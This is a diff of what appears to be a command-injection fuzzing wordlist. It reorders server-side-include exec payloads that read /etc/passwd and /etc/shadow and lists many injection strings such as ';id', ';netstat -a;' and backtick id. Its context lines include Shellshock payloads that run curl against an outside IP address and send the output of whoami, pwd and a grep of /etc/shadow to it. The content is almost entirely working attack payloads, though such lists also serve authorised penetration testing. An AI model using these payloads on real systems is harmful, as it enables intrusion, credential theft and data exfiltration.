@@ -1,9 +1,3 @@
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-/index.html|id|
-;id;
 ;id
 ;netstat -a;
 ;system('cat%20/etc/passwd')
@@ -69,6 +63,11 @@ a|/usr/bin/id
 %0a id %0a
 `id`
 $;/usr/bin/id
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
